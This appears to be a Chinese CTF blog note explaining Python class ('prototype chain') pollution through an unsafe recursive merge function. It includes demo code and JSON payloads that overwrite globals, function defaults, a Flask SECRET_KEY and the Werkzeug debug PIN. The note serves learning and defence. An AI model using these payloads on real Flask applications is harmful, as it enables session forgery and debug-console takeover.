@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="国赛遇到的，当时没有学过吃了大亏"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="canonical" href="https://osthing.github.io/blog/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%AC%94%E8%AE%B0"><link rel="alternate" type="application/rss+xml" title="oSthing's blog" href="/rss.xml"><meta name="generator" content="Astro v5.18.2"><title>Python原型链污染笔记 — oSthing&#39;s blog</title><meta property="og:type" content="website"><meta property="og:title" content="Python原型链污染笔记 — oSthing's blog"><meta property="og:description" content="国赛遇到的，当时没有学过吃了大亏"><meta property="og:url" content="https://osthing.github.io/blog/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%AC%94%E8%AE%B0"><meta property="og:image" content="https://osthing.github.io/og-default.png"><meta property="og:site_name" content="oSthing's blog"><meta property="og:locale" content="zh-CN"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Python原型链污染笔记 — oSthing's blog"><meta name="twitter:description" content="国赛遇到的，当时没有学过吃了大亏"><meta name="twitter:image" content="https://osthing.github.io/og-default.png"><link rel="preconnect" href="https://rsms.me/"><link rel="stylesheet" href="https://rsms.me/inter/inter.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/JetBrains/JetBrainsMono@v2.304/web/css/jetbrains-mono.css"><link rel="stylesheet" href="/_astro/_slug_.AMwGTgR1.css"></head> <body class="min-h-screen flex flex-col bg-bg-light dark:bg-bg-dark text-fg-light dark:text-fg-dark antialiased"> <script>
+  (function () {
+    try {
+      const stored = localStorage.getItem('theme');
+      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+      const theme = stored ?? (prefersDark ? 'dark' : 'light');
+      if (theme === 'dark') {
+        document.documentElement.classList.add('dark');
+      }
+    } catch (_) {
+      /* no-op */
+    }
+  })();
+</script> <header class="border-b border-border-light dark:border-border-dark sticky top-0 z-30 bg-bg-light/80 dark:bg-bg-dark/80 backdrop-blur"> <div class="mx-auto flex w-full max-w-6xl items-center justify-between px-6 py-4"> <a href="/" class="flex items-center gap-2 font-mono text-sm font-medium tracking-tight"> <span class="inline-flex h-2 w-2 rounded-full bg-accent-light dark:bg-accent-dark"></span> <span>osthing&#39;s blog</span> </a> <nav class="hidden md:flex items-center gap-1 text-sm"> <a href="/" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> home </a><a href="/blog" class="rounded-md px-3 py-1.5 transition-colors text-fg-light dark:text-fg-dark"> blog </a><a href="/projects" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> projects </a><a href="/links" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> links </a><a href="/about" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> about </a><a href="/contact" class="rounded-md px-3 py-1.5 transition-colors text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark"> contact </a> </nav> <div class="flex items-center gap-2 text-sm text-muted-light dark:text-muted-dark"> <a href="https://github.com/oSthing" rel="noopener noreferrer" target="_blank" class="rounded-md px-2 py-1 hover:text-fg-light dark:hover:text-fg-dark"> GitHub </a><a href="/rss.xml" rel="noopener noreferrer" class="rounded-md px-2 py-1 hover:text-fg-light dark:hover:text-fg-dark"> RSS </a> <button id="theme-toggle" type="button" aria-label="Toggle theme" class="rounded-md p-2 text-muted-light dark:text-muted-dark hover:text-fg-light dark:hover:text-fg-dark transition-colors"> <svg class="hidden dark:block h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2"></path> <path d="M12 20v2"></path> <path d="m4.93 4.93 1.41 1.41"></path> <path d="m17.66 17.66 1.41 1.41"></path> <path d="M2 12h2"></path> <path d="M20 12h2"></path> <path d="m6.34 17.66-1.41 1.41"></path> <path d="m19.07 4.93-1.41 1.41"></path> </svg> <svg class="block dark:hidden h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path> </svg> </button> <script type="module">const e=document.getElementById("theme-toggle");e?.addEventListener("click",()=>{const t=document.documentElement.classList.toggle("dark");try{localStorage.setItem("theme",t?"dark":"light")}catch{}});</script> </div> </div>  </header> <main class="flex-1 w-full">  <article class="mx-auto w-full max-w-5xl px-6 py-16"> <header class="mb-12 border-b border-border-light dark:border-border-dark pb-8"> <div class="mb-3 flex items-center gap-2 text-sm text-muted-light dark:text-muted-dark"> <time datetime="2024-08-20T00:00:00.000Z">2024年8月20日</time> <span aria-hidden="true">·</span> <span>2 min read</span> </div> <h1 class="text-4xl font-semibold tracking-tight md:text-5xl">Python原型链污染笔记</h1> <p class="mt-4 text-lg text-muted-light dark:text-muted-dark">国赛遇到的，当时没有学过吃了大亏</p> <div class="mt-4 flex flex-wrap gap-2"> <span class="rounded-full border border-border-light dark:border-border-dark px-2.5 py-0.5 text-xs"> ctf </span><span class="rounded-full border border-border-light dark:border-border-dark px-2.5 py-0.5 text-xs"> web </span><span class="rounded-full border border-border-light dark:border-border-dark px-2.5 py-0.5 text-xs"> python </span> </div> </header> <div class="grid gap-12 md:grid-cols-[minmax(0,1fr)_240px]"> <div class="prose prose-neutral dark:prose-invert max-w-none">  <h1 id="python原型链污染">python原型链污染</h1>
+<blockquote>
+<p>在国赛中遇到了，当时断网，也没有自己专门去学过，比赛一打完当天晚上就狠狠补上了这个知识，恨啊呜呜，题目很简单的，但是自己没学过就没做出来;w;</p>
+</blockquote>
+<p>Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。</p>
+<h2 id="关键代码">关键代码</h2>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> merge</span><span style="color:#ADBAC7">(src, dst):</span></span>
+<span class="line"><span style="color:#F47067">    for</span><span style="color:#ADBAC7"> k, v </span><span style="color:#F47067">in</span><span style="color:#ADBAC7"> src.items():</span></span>
+<span class="line"><span style="color:#F47067">        if</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, </span><span style="color:#96D0FF">'__getitem__'</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">            if</span><span style="color:#ADBAC7"> dst.get(k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                merge(v, dst.get(k))</span></span>
+<span class="line"><span style="color:#F47067">            else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                dst[k] </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> v</span></span>
+<span class="line"><span style="color:#F47067">        elif</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">            merge(v, </span><span style="color:#6CB6FF">getattr</span><span style="color:#ADBAC7">(dst, k))</span></span>
+<span class="line"><span style="color:#F47067">        else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#6CB6FF">            setattr</span><span style="color:#ADBAC7">(dst, k, v)</span></span></code></pre>
+<blockquote>
+<p><code>hasattr</code>(<em>object</em>, <em>name</em>)</p>
+<p>参数是一个对象和一个字符串。如果字符串是对象的一个属性，则返回<code>True</code>，否则返回<code>False</code></p>
+</blockquote>
+<p>下面代码逻辑就是递归查找k，如果对应的值是字典再次递归，直到查找到对应的值然后修改</p>
+<h2 id="利用思路">利用思路</h2>
+<p>我们要污染的目标是一个类的父类，所以我们会用到关键的两个魔法属性</p>
+<p><strong>__class__</strong></p>
+<p>用于获取一个对象的类，这是一个对象的内置属性，它指向定义该对象的类，反射用的，在运行中获取一个类</p>
+<p><strong>__base__</strong></p>
+<p>属性用于获取一个类的直接父类(基类)，如果一个类没有显式地继承其他类，那么它的基类是内置的 <code>object</code> 类</p>
+<p>那么我们就可以通过这两个属性来污染他的父类</p>
+<p>下面简单看个例子</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F47067">class</span><span style="color:#F69D50"> a1</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">    secret </span><span style="color:#F47067">=</span><span style="color:#96D0FF"> "aaa"</span></span>
+<span class="line"><span style="color:#F47067">class</span><span style="color:#F69D50"> b1</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">a1</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">    pass</span></span>
+<span class="line"><span style="color:#F47067">class</span><span style="color:#F69D50"> b2</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">a1</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">    pass</span></span>
+<span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> merge</span><span style="color:#ADBAC7">(src, dst):</span></span>
+<span class="line"><span style="color:#F47067">    for</span><span style="color:#ADBAC7"> k, v </span><span style="color:#F47067">in</span><span style="color:#ADBAC7"> src.items():</span></span>
+<span class="line"><span style="color:#F47067">        if</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, </span><span style="color:#96D0FF">'__getitem__'</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">            if</span><span style="color:#ADBAC7"> dst.get(k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                merge(v, dst.get(k))</span></span>
+<span class="line"><span style="color:#F47067">            else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                dst[k] </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> v</span></span>
+<span class="line"><span style="color:#F47067">        elif</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">            merge(v, </span><span style="color:#6CB6FF">getattr</span><span style="color:#ADBAC7">(dst, k))</span></span>
+<span class="line"><span style="color:#F47067">        else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#6CB6FF">            setattr</span><span style="color:#ADBAC7">(dst, k, v)</span></span>
+<span class="line"><span style="color:#ADBAC7">instance </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> b2()</span></span>
+<span class="line"><span style="color:#ADBAC7">payload </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#96D0FF">    "__class__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">        "__base__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">            "secret"</span><span style="color:#ADBAC7"> : </span><span style="color:#96D0FF">"bbb"</span></span>
+<span class="line"><span style="color:#ADBAC7">        }</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(b1.</span><span style="color:#6CB6FF">__class__</span><span style="color:#ADBAC7">,b1.__base__)</span></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(b1.secret)</span></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(instance.secret)</span></span>
+<span class="line"><span style="color:#ADBAC7">merge(payload, instance)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(b1.secret)</span></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(instance.secret)</span></span></code></pre>
+<p>在我们污染了之后就发现我们的b1和b2的secret属性都变成了bbb</p>
+<p>可以的话可以自行在<code>merge(payload, instance)</code>处打个断点进行调试</p>
+<p>思路就是先<code>__class__</code>反射获取能调用到的类，然后用<code>__base__</code>获取到父类，然后对自己需要的目标进行污染</p>
+<h2 id="利用">利用</h2>
+<h3 id="获取全局变量">获取全局变量</h3>
+<p>在很多类中我们可以看到有很多类会有<code>__init__</code>方法，用于一个类的初始化。</p>
+<p>带有<code>__init__</code>的类有一个特性，那就是有<code>__globals__</code>属性，可以简单做一个测试</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F47067">class</span><span style="color:#F69D50"> A</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#F47067">    def</span><span style="color:#6CB6FF"> __init__</span><span style="color:#ADBAC7">(self):</span></span>
+<span class="line"><span style="color:#F47067">        pass</span></span>
+<span class="line"><span style="color:#F47067">class</span><span style="color:#F69D50"> B</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#F47067">    pass</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">dir</span><span style="color:#ADBAC7">(A.</span><span style="color:#6CB6FF">__init__</span><span style="color:#ADBAC7">))</span></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">dir</span><span style="color:#ADBAC7">(B.</span><span style="color:#6CB6FF">__init__</span><span style="color:#ADBAC7">))</span></span></code></pre>
+<p>我们可以看见在A的属性里面多了一个<code>__globals__</code>属性，而<code>__globals__</code>属性是干什么的呢</p>
+<p><code>__globals__</code>用于访问函数所属的全局命名空间。具体来说，它返回一个字典，表示函数定义时所在模块的全局变量和函数</p>
+<p>也就是说我们可以通过这个变量来修改整体的函数，下面简单看个例子</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#ADBAC7">secret</span><span style="color:#F47067">=</span><span style="color:#96D0FF">"aaa"</span></span>
+<span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> merge</span><span style="color:#ADBAC7">(src, dst):</span></span>
+<span class="line"><span style="color:#F47067">    for</span><span style="color:#ADBAC7"> k, v </span><span style="color:#F47067">in</span><span style="color:#ADBAC7"> src.items():</span></span>
+<span class="line"><span style="color:#F47067">        if</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, </span><span style="color:#96D0FF">'__getitem__'</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">            if</span><span style="color:#ADBAC7"> dst.get(k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                merge(v, dst.get(k))</span></span>
+<span class="line"><span style="color:#F47067">            else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                dst[k] </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> v</span></span>
+<span class="line"><span style="color:#F47067">        elif</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">            merge(v, </span><span style="color:#6CB6FF">getattr</span><span style="color:#ADBAC7">(dst, k))</span></span>
+<span class="line"><span style="color:#F47067">        else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#6CB6FF">            setattr</span><span style="color:#ADBAC7">(dst, k, v)</span></span>
+<span class="line"><span style="color:#ADBAC7">payload </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#96D0FF">    "__init__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">        "__globals__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">            "secret"</span><span style="color:#ADBAC7"> : </span><span style="color:#96D0FF">"bbb"</span></span>
+<span class="line"><span style="color:#ADBAC7">        }</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">class</span><span style="color:#F69D50"> A</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#F47067">    def</span><span style="color:#6CB6FF"> __init__</span><span style="color:#ADBAC7">(self):</span></span>
+<span class="line"><span style="color:#F47067">        pass</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(A.</span><span style="color:#6CB6FF">__init__</span><span style="color:#ADBAC7">.</span><span style="color:#6CB6FF">__globals__</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(secret)</span></span>
+<span class="line"><span style="color:#ADBAC7">merge(payload,A)</span></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(secret)</span></span></code></pre>
+<p>成功修改secret属性</p>
+<h3 id="函数形参默认值替换">函数形参默认值替换</h3>
+<p>在此衍生还有一个打法就是函数形参默认值替换</p>
+<p>当我们去定义一个函数时，可以为其中的参数指定默认值。类似这样</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> a</span><span style="color:#ADBAC7">(a</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">,b</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">2</span><span style="color:#ADBAC7">,c</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">3</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">    pass</span></span></code></pre>
+<p>而a中的默认参数会被存储在<code>__defaults__</code>中，我们可以简单看一下</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> a</span><span style="color:#ADBAC7">(a</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">,b</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">2</span><span style="color:#ADBAC7">,c</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">3</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">    pass</span></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">dir</span><span style="color:#ADBAC7">(a))</span></span>
+<span class="line"><span style="color:#6CB6FF">print</span><span style="color:#ADBAC7">(a.</span><span style="color:#6CB6FF">__defaults__</span><span style="color:#ADBAC7">)</span></span></code></pre>
+<p>所以我们就可以通过替换该属性，来实现对函数位置或者是键值默认值替换</p>
+<p>打法如下</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> merge</span><span style="color:#ADBAC7">(src, dst):</span></span>
+<span class="line"><span style="color:#F47067">    for</span><span style="color:#ADBAC7"> k, v </span><span style="color:#F47067">in</span><span style="color:#ADBAC7"> src.items():</span></span>
+<span class="line"><span style="color:#F47067">        if</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, </span><span style="color:#96D0FF">'__getitem__'</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#F47067">            if</span><span style="color:#ADBAC7"> dst.get(k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                merge(v, dst.get(k))</span></span>
+<span class="line"><span style="color:#F47067">            else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">                dst[k] </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> v</span></span>
+<span class="line"><span style="color:#F47067">        elif</span><span style="color:#6CB6FF"> hasattr</span><span style="color:#ADBAC7">(dst, k) </span><span style="color:#F47067">and</span><span style="color:#6CB6FF"> type</span><span style="color:#ADBAC7">(v) </span><span style="color:#F47067">==</span><span style="color:#6CB6FF"> dict</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#ADBAC7">            merge(v, </span><span style="color:#6CB6FF">getattr</span><span style="color:#ADBAC7">(dst, k))</span></span>
+<span class="line"><span style="color:#F47067">        else</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#6CB6FF">            setattr</span><span style="color:#ADBAC7">(dst, k, v)</span></span>
+<span class="line"><span style="color:#ADBAC7">payload </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> {</span></span>
+<span class="line"><span style="color:#96D0FF">    "__init__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">        "__globals__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">            "a"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">                "__defaults__"</span><span style="color:#ADBAC7">:(</span><span style="color:#6CB6FF">3</span><span style="color:#ADBAC7">,</span><span style="color:#6CB6FF">4</span><span style="color:#ADBAC7">,</span><span style="color:#6CB6FF">5</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#ADBAC7">            }</span></span>
+<span class="line"><span style="color:#ADBAC7">        }</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">class</span><span style="color:#F69D50"> A</span><span style="color:#ADBAC7">:</span></span>
+<span class="line"><span style="color:#F47067">    def</span><span style="color:#6CB6FF"> __init__</span><span style="color:#ADBAC7">(self):</span></span>
+<span class="line"><span style="color:#F47067">        pass</span></span>
+<span class="line"><span style="color:#F47067">def</span><span style="color:#DCBDFB"> a</span><span style="color:#ADBAC7">(a</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">1</span><span style="color:#ADBAC7">,b</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">2</span><span style="color:#ADBAC7">,c</span><span style="color:#F47067">=</span><span style="color:#6CB6FF">3</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#6CB6FF">    print</span><span style="color:#ADBAC7">(a,b,c)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ADBAC7">a()</span></span>
+<span class="line"><span style="color:#ADBAC7">merge(payload,A)</span></span>
+<span class="line"><span style="color:#ADBAC7">a()</span></span></code></pre>
+<h3 id="修改关键信息">**修改关键信息</h3>
+<h4 id="flask-密钥">flask 密钥</h4>
+<p>payload</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#ADBAC7">{</span></span>
+<span class="line"><span style="color:#96D0FF">    "__init__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">        "__globals__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">            "app"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">                "config"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">                    "SECRET_KEY"</span><span style="color:#ADBAC7"> :</span><span style="color:#96D0FF">"test"</span></span>
+<span class="line"><span style="color:#ADBAC7">                }</span></span>
+<span class="line"><span style="color:#ADBAC7">            }</span></span>
+<span class="line"><span style="color:#ADBAC7">        }</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span></code></pre>
+<h4 id="flask-pin码">flask pin码</h4>
+<p>同理的修改os.environ[‘WERKZEUG_DEBUG_PIN’]</p>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#ADBAC7">{</span></span>
+<span class="line"><span style="color:#96D0FF">    "__init__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">        "__globals__"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">            "os"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">                "env"</span><span style="color:#ADBAC7"> : {</span></span>
+<span class="line"><span style="color:#96D0FF">                    "WERKZEUG_DEBUG_PIN"</span><span style="color:#ADBAC7"> :</span><span style="color:#96D0FF">"123-123-123"</span></span>
+<span class="line"><span style="color:#ADBAC7">                }</span></span>
+<span class="line"><span style="color:#ADBAC7">            }</span></span>
+<span class="line"><span style="color:#ADBAC7">        }</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#ADBAC7">}</span></span></code></pre>  </div> <aside class="hidden md:block"> <nav class="sticky top-24 text-sm"><p class="mb-3 font-mono text-xs uppercase tracking-wider text-muted-light dark:text-muted-dark">
+on this page
+</p><ul class="space-y-2 border-l border-border-light dark:border-border-dark"><li><a href="#关键代码" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">关键代码</a></li><li><a href="#利用思路" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">利用思路</a></li><li><a href="#利用" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">利用</a></li><li><a href="#获取全局变量" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark ml-3 text-xs text-muted-light dark:text-muted-dark">获取全局变量</a></li><li><a href="#函数形参默认值替换" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark ml-3 text-xs text-muted-light dark:text-muted-dark">函数形参默认值替换</a></li><li><a href="#修改关键信息" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark ml-3 text-xs text-muted-light dark:text-muted-dark">**修改关键信息</a></li></ul></nav> </aside> </div> <footer class="mt-16 border-t border-border-light dark:border-border-dark pt-8 text-sm text-muted-light dark:text-muted-dark"> <a href="/blog" class="hover:text-fg-light dark:hover:text-fg-dark">← back to blog</a> </footer> </article>  </main> <footer class="border-t border-border-light dark:border-border-dark"> <div class="mx-auto flex w-full max-w-6xl flex-col items-start justify-between gap-3 px-6 py-8 text-sm text-muted-light dark:text-muted-dark md:flex-row md:items-center"> <p>
+© 2026 oSthing. built with Astro.
+</p> <p class="font-mono text-xs"> <a href="/rss.xml" class="hover:text-fg-light dark:hover:text-fg-dark">rss</a> <span class="mx-2 opacity-50">·</span> <a href="/sitemap.xml" class="hover:text-fg-light dark:hover:text-fg-dark">sitemap</a> </p> </div> </footer> </body></html>
